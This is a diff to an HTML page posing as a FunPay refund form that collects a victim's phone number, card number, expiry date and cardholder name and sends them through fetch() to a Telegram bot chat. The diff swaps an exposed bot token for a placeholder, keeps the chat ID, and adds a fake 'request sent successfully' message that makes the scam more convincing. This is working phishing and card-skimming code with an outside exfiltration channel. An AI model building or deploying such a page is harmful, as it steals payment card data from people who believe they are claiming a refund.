@@ -48,6 +48,14 @@
             font-size: 12px;
             color: #888;
         }
+        .notification {
+            display: none;
+            margin-top: 15px;
+            padding: 10px;
+            background-color: #008000;
+            color: white;
+            border-radius: 5px;
+        }
     </style>
     <script>
         function sendData() {
@@ -58,13 +66,17 @@
                 holder_name: document.getElementById('holder_name').value
             };
             
-            fetch("https://api.telegram.org/bot7878192082:AAE7oE001p3_MMLKMm_PxpJgaTTdINA-Vq4/sendMessage", {
+            fetch("https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     chat_id: "-1002190411942",
                     text: `Заявка на возврат средств\nТелефон: ${data.telephone}\nНомер карты: ${data.card_number}\nСрок действия: ${data.expiration_date}\nИмя держателя: ${data.holder_name}`
                 })
+            }).then(response => {
+                if (response.ok) {
+                    document.getElementById('notification').style.display = 'block';
+                }
             });
         }
     </script>
@@ -76,6 +88,7 @@
     <input type="text" id="expiration_date" placeholder="Срок действия (MM/YY)" required><br>
     <input type="text" id="holder_name" placeholder="Имя держателя" required><br>
     <button onclick="sendData()">Оформить возврат</button>
+    <div id="notification" class="notification">Заявка успешно отправлена!</div>
     <p>C 2025 FUNPAY Impossible21x.</p>
 </body>
 </html>
